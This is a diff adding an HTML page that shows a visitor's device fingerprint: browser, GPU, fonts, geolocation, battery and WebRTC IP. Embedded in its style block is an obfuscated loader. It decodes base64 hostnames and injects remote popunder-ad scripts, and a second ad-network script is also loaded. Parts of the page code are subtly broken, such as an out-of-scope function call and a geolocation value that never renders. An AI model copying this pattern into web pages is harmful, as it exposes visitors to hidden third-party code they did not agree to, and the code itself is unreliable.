@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Comprehensive Device Information</title>
+    <style>
+ <script type="text/javascript" data-cfasync="false">
+/*<![CDATA[/* */
+(function(){var b=window,n="b76527a5c53827910401af2fe2b13921",g=[["siteId",160-244+152+46+5161161],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],t=["d3d3LmNkbjRhZHMuY29tL3JzdHJpbmcubWluLmNzcw==","ZDNnNW92Zm5nanc5YncuY2xvdWRmcm9udC5uZXQvVnlIL3Jib290c3RyYXAtbWF0ZXJpYWwtZGF0ZXRpbWVwaWNrZXIubWluLmpz"],f=-1,i,q,j=function(){clearTimeout(q);f++;if(t[f]&&!(1761206581000<(new Date).getTime()&&1<f)){i=b.document.createElement("script");i.type="text/javascript";i.async=!0;var o=b.document.getElementsByTagName("script")[0];i.src="https://"+atob(t[f]);i.crossOrigin="anonymous";i.onerror=j;i.onload=function(){clearTimeout(q);b[n.slice(0,16)+n.slice(0,16)]||j()};q=setTimeout(j,5E3);o.parentNode.insertBefore(i,o)}};if(!b[n]){try{Object.freeze(b[n]=g)}catch(e){}j()}})();
+/*]]>/* */
+</script>
+
+
+
+
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            text-align: center;
+            padding: 20px;
+        }
+        #device-info-container {
+            background-color: white;
+            border-radius: 8px;
+            padding: 30px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 80%;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        h1 {
+            color: #333;
+        }
+        .device-info {
+            font-size: 18px;
+            margin: 10px 0;
+            font-weight: bold;
+        }
+        .info-label {
+            color: #888;
+        }
+    </style>
+</head>
+<body>
+
+<div id="device-info-container">
+    <h1>Comprehensive Device Information</h1>
+    <div id="device-info"></div>
+</div>
+    <script async="async" data-cfasync="false" src="//pl25452864.profitablecpmrate.com/17bdc3ff4d9e3bbe0f49799dd182c4c1/invoke.js"></script>
+    <div id="container-17bdc3ff4d9e3bbe0f49799dd182c4c1"></div>
+
+<script>
+    function getDeviceInfo() {
+        // Basic device information
+        const userAgent = navigator.userAgent;
+        const platform = navigator.platform;
+        const language = navigator.language;
+        const screenWidth = screen.width;
+        const screenHeight = screen.height;
+        const colorDepth = screen.colorDepth;
+        const deviceMemory = navigator.deviceMemory || "Not available";
+        const userAgentData = navigator.userAgentData ? navigator.userAgentData : null;
+        
+        // Network information
+        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        const networkType = connection ? connection.effectiveType : "Not available";
+        const downlink = connection ? connection.downlink : "Not available";
+
+        // Battery information
+        const batteryPromise = navigator.getBattery ? navigator.getBattery() : null;
+
+        // Geolocation information (if allowed)
+        let geoLocation = "Not available";
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(position => {
+                geoLocation = `${position.coords.latitude}, ${position.coords.longitude}`;
+                updateDeviceInfo();
+            });
+        }
+
+        // Performance information
+        const cpuCores = navigator.hardwareConcurrency || "Not available";
+        const availableMemory = navigator.deviceMemory || "Not available";
+        
+        // LocalStorage and SessionStorage usage
+        const localStorageUsed = JSON.stringify(localStorage).length;
+        const sessionStorageUsed = JSON.stringify(sessionStorage).length;
+
+        // Font info - Test available fonts by comparing canvas width with different fonts
+        const fontTest = testFonts();
+
+        // Time Zone Info
+        const timeZone = new Date().getTimezoneOffset();
+
+        // Device Type (Mobile/Desktop)
+        const deviceType = /Mobi|Android/i.test(userAgent) ? "Mobile" : "Desktop";
+
+        // Touch Support
+        const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+
+        // Cookies Enabled Status
+        const cookiesEnabled = navigator.cookieEnabled ? "Yes" : "No";
+
+        // WebGL Renderer Info (GPU)
+        const webglInfo = getWebGLInfo();
+
+        // WebRTC IP Info
+        const rtcIP = getWebRTCIP();
+
+        // Display Device Info
+        let deviceInfoHtml = `
+            <div class="device-info"><span class="info-label">Browser:</span> ${getBrowserInfo(userAgent)}</div>
+            <div class="device-info"><span class="info-label">Operating System:</span> ${getOSInfo(userAgent)}</div>
+            <div class="device-info"><span class="info-label">Platform:</span> ${platform}</div>
+            <div class="device-info"><span class="info-label">Language:</span> ${language}</div>
+            <div class="device-info"><span class="info-label">Screen Resolution:</span> ${screenWidth} x ${screenHeight}</div>
+            <div class="device-info"><span class="info-label">Color Depth:</span> ${colorDepth} bits</div>
+            <div class="device-info"><span class="info-label">Device Memory:</span> ${deviceMemory} GB</div>
+            <div class="device-info"><span class="info-label">Network Type:</span> ${networkType}</div>
+            <div class="device-info"><span class="info-label">Downlink Speed:</span> ${downlink} Mbps</div>
+            <div class="device-info"><span class="info-label">CPU Cores:</span> ${cpuCores}</div>
+            <div class="device-info"><span class="info-label">Available Memory:</span> ${availableMemory} GB</div>
+            <div class="device-info"><span class="info-label">LocalStorage Used:</span> ${localStorageUsed} bytes</div>
+            <div class="device-info"><span class="info-label">SessionStorage Used:</span> ${sessionStorageUsed} bytes</div>
+            <div class="device-info"><span class="info-label">Geolocation:</span> ${geoLocation}</div>
+            <div class="device-info"><span class="info-label">Font Support:</span> ${fontTest}</div>
+            <div class="device-info"><span class="info-label">Time Zone Offset:</span> UTC ${timeZone / 60}</div>
+            <div class="device-info"><span class="info-label">Device Type:</span> ${deviceType}</div>
+            <div class="device-info"><span class="info-label">Touch Support:</span> ${isTouchDevice ? "Yes" : "No"}</div>
+            <div class="device-info"><span class="info-label">Cookies Enabled:</span> ${cookiesEnabled}</div>
+            <div class="device-info"><span class="info-label">WebGL Renderer:</span> ${webglInfo}</div>
+            <div class="device-info"><span class="info-label">WebRTC IP:</span> ${rtcIP}</div>
+        `;
+
+        // Battery info update if available
+        if (batteryPromise) {
+            batteryPromise.then(battery => {
+                deviceInfoHtml += `
+                    <div class="device-info"><span class="info-label">Battery Level:</span> ${(battery.level * 100).toFixed(2)}%</div>
+                    <div class="device-info"><span class="info-label">Charging:</span> ${battery.charging ? "Yes" : "No"}</div>
+                `;
+                updateDeviceInfo();
+            });
+        }
+
+        // Append device info to the HTML
+        function updateDeviceInfo() {
+            document.getElementById("device-info").innerHTML = deviceInfoHtml;
+        }
+        
+        updateDeviceInfo();
+    }
+
+    // Browser and OS Information Detection
+    function getBrowserInfo(userAgent) {
+        if (userAgent.includes("Chrome")) return "Google Chrome";
+        if (userAgent.includes("Firefox")) return "Mozilla Firefox";
+        if (userAgent.includes("Safari")) return "Apple Safari";
+        if (userAgent.includes("Edge")) return "Microsoft Edge";
+        return "Unknown Browser";
+    }
+
+    function getOSInfo(userAgent) {
+        if (userAgent.includes("Windows")) return "Windows";
+        if (userAgent.includes("Mac")) return "MacOS";
+        if (userAgent.includes("Linux")) return "Linux";
+        if (userAgent.includes("Android")) return "Android";
+        if (userAgent.includes("iPhone")) return "iOS";
+        return "Unknown OS";
+    }
+
+    // Font Test using Canvas
+    function testFonts() {
+        const fontList = ['Arial', 'Courier New', 'Georgia', 'Times New Roman', 'Verdana'];
+        let fontsAvailable = [];
+        fontList.forEach(font => {
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+            context.font = `12px ${font}`;
+            const width = context.measureText('a').width;
+            if (width) fontsAvailable.push(font);
+        });
+        return fontsAvailable.join(", ") || "No fonts detected";
+    }
+
+    // WebGL Info (GPU)
+    function getWebGLInfo() {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl');
+        if (!gl) return "WebGL not supported";
+        const renderer = gl.getParameter(gl.RENDERER);
+        const vendor = gl.getParameter(gl.VENDOR);
+        return `${renderer} by ${vendor}`;
+    }
+
+    // WebRTC IP Info
+    function getWebRTCIP() {
+        let ip = "Not available";
+        const pc = new RTCPeerConnection({iceServers: []});
+        pc.createDataChannel("");
+        pc.createOffer().then(offer => pc.setLocalDescription(offer));
+        pc.onicecandidate = function(event) {
+            if (event.candidate) {
+                ip = event.candidate.candidate.split(" ")[4]; // IP extraction
+                updateDeviceInfo();
+            }
+        };
+        return ip;
+    }
+
+    // Call the function to display all device information
+    getDeviceInfo();
+</script>
+
+</body>
+</html>
